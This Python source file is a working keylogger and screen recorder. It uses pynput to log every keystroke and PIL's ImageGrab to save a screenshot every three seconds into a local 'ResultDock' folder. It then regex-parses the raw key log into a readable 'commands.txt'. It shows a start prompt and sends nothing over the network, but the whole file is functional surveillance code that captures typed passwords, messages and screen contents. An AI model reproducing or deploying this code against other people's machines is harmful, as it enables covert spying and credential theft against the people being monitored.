""" Import built-in modules """
import pathlib
import re
import sys
import time
import os
from multiprocessing import Process
# Import third-party modules #
from PIL import ImageGrab
from pynput.keyboard import Key, Listener


# Pseudo constants #
WAIT_TIME = 3

# Global variables #
global KEY_FILE, SCREENSHOT
LAST_PIC = 0


def on_press(key):
    """
    For key listener, write sentence to file if enter is pressed, kill screenshot capturing process
    if escape is pressed, otherwise append the entered key to the key capture list to form sentence.

    :param key:  The key that the key listener detected the user pressed.
    :return:  Nothing on enter key, boolean false on escape key, otherwise the keys capture list \
              with new member.
    """
    global KEY_FILE, KEYS, SCREENSHOT

    # If the enter key was pressed #
    if key == Key.enter:
        # Write the sentence logged in keys capture list to file #
        KEY_FILE.write(f'{str(KEYS)}\n\n')
        del KEYS[:]
    # If the escape key was pressed #
    elif key == Key.esc:
        # Kill the screenshot capturing process #
        SCREENSHOT.terminate()
        return False
    # If the key is intended to be recorded #
    else:
        KEYS.append(key)
        return KEYS

    return True

def screenshots(path: str):
    """
    Loop that actively takes screenshots based on wait time interval.

    :param path:  Path to local storage for files.
    :return:  Nothing
    """
    global LAST_PIC

    while True:
        # Take a screenshot #
        pic = ImageGrab.grab()

        while True:
            # Format screenshot to number of last capture #
            pic_path = f'{path}Screenshot{LAST_PIC}.png'

            # If file name is unique #
            if not os.path.isfile(pic_path):
                # Save the picture as png #
                pic.save(pic_path)
                # Increment static count #
                LAST_PIC += 1
                break

            # Increment static count #
            LAST_PIC += 1

        # Sleep execution by time interval #
        time.sleep(WAIT_TIME)


def regex_formatting(path):
    """
    Parses the logged pynput keys into human-readable format.

    :param path:  Path to local storage for files.
    :return:  Nothing
    """
    # Compile parsing patterns #
    regex = re.compile(r'(?:(^\[)|([\',])|(]$))')
    regex2 = re.compile(r'''<Key\.
                            (?:ctrl|shift|alt|caps_lock|
                            tab|cmd|home|insert|delete|
                            end|page|left|down|right|up|
                            print_screen
                            )
                            ((?:_l|_r|_up|_down
                            )?)
                            :.<\d+>>''', re.X)

    regex3 = re.compile(r'[^\S\r\n]')
    regex4 = re.compile(r'.<Key\.backspace:<\d+>>')
    regex5 = re.compile(r'<Key\.space:>')

    # Open un-formatted file #
    try:
        with open(f'{path}keys.txt', encoding='utf-8') as parse_file:
            # Iterate line by line #
            for line in parse_file:
                # Perform a series of parsing substitutions #
                sub = re.sub(regex, r'', str(line))
                sub2 = re.sub(regex2, r'', str(sub))
                sub3 = re.sub(regex3, r'', str(sub2))
                sub4 = re.sub(regex4, r'', str(sub3))
                result = re.sub(regex5, r' ', str(sub4))

                # Open the result command log file #
                with open(f'{path}commands.txt', 'a', encoding='utf-8') as final_log:
                    # Write parsed result to file #
                    final_log.write(result)

    # If error occurs during file operation #
    except (IOError, OSError) as file_err:
        print(f'\n* [ERROR] Error occurred writing to file: {file_err}', file=sys.stderr)
        sys.exit(3)


def main():
    """
    Facilitates key listener thread and screenshot capture.

    :return:  Nothing
    """
    global KEY_FILE, SCREENSHOT

    input('Please hit enter to begin or ctrl+c to stop ')
    print('\nNow taking screenshots, hit escape to stop')

    try:
        # Open the file to record keystrokes #
        with open(f'{file_path}keys.txt', 'a', encoding='utf-8') as KEY_FILE:
            # Create the key listener and screenshot taker #
            key_listener = Listener(on_press=on_press)
            SCREENSHOT = Process(target=screenshots, args=(file_path,))

            # Start the processes #
            key_listener.start()
            SCREENSHOT.start()

            # Join the processes #
            key_listener.join(600.0)
            SCREENSHOT.join(timeout=600)

    # If error occurs during file operation #
    except (IOError, OSError) as file_err:
        print(f'\n* [ERROR] Error occurred writing to file: {file_err}', file=sys.stderr)
        sys.exit(2)

    # Call the function to parse key logs to readable format #
    regex_formatting(file_path)

    print()
    main()


if __name__ == '__main__':
    # List for recording key presses #
    KEYS = []
    # Get the current working directory #
    cwd = os.getcwd()

    # If OS is Windows #
    if os.name == 'nt':
        file_path = f'{cwd}\\ResultDock\\'
    # Linux #
    else:
        file_path = f'{cwd}/ResultDock/'

    # Create storage directory #
    pathlib.Path(file_path).mkdir(parents=True, exist_ok=True)

    try:
        main()

    # If Ctrl + c is detected #
    except KeyboardInterrupt:
        print('* Ctrl-C detected ... exiting program *')

    # If unknown system exception occurs #
    except Exception as ex:
        print('\n* [ERROR] Unknown exception occurred: %s *', ex, file=sys.stderr)
        sys.exit(1)

    sys.exit(0)
